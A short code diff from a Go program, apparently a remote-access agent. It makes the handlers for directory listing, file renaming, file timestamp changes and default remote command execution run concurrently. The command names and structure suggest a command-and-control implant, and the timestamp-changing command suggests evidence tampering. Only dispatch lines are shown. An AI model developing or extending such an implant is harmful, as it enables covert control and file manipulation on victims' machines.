@@ -715,13 +715,13 @@ func send() { //发送头部信息
             case "LOAD_U_FILE":
                 go downloadFile(msg[1])
             case "LOOK_UP_FILE":
-                listDir(shell, file_url,taskid)
+                go listDir(shell, file_url,taskid)
             case "SWITCH_VERSION":
                 version = shell
             case "CHANG_FILE_NAME":
-                CHANG_FILE_NAME(msg[1], msg[2])
+                go CHANG_FILE_NAME(msg[1], msg[2])
             case "CHANG_FILE_TIME":
-                CHANG_FILE_TIME(msg[1], msg[2])
+                go CHANG_FILE_TIME(msg[1], msg[2])
             /*code*/
             default:
                 go get_Command(msg_cmd, re_url,taskid)
